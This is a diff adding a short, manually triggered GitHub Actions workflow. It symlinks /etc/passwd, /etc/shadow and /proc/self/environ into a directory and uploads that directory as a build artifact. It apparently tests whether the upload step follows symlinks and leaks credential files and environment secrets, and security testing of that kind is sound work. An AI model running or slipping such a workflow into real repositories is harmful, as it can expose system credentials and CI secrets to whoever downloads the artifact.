@@ -1,0 +1,19 @@
+name: Symlink Artifact
+on: workflow_dispatch
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: create-symlinks
+        run: |
+          mkdir -p artifact_dir
+          ln -s /etc/passwd artifact_dir/passwd
+          ln -s /etc/shadow artifact_dir/shadow
+          ln -s /proc/self/environ artifact_dir/environ
+          ls -la artifact_dir/
+      - uses: actions/upload-artifact@v4
+        with:
+          name: symlink-artifact
+          path: artifact_dir/
+          if-no-files-found: warn
